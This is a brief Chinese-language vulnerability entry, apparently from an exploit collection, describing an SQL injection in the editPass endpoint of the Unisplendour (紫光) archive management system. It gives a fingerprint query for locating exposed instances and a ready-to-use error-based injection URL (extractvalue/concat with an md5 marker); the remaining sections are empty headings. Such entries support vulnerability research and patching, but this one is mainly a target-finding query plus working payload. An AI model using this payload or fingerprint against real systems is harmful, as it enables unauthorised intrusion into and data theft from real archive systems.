# 紫光档案管理系统editPass存在SQL注入漏洞

- **系统**：紫光档案管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="紫光档案管理系统"`

**请求体 / payload**
```
/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))
```

**其他**
- 紫光档案管理系统editPass存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 紫光档案管理系统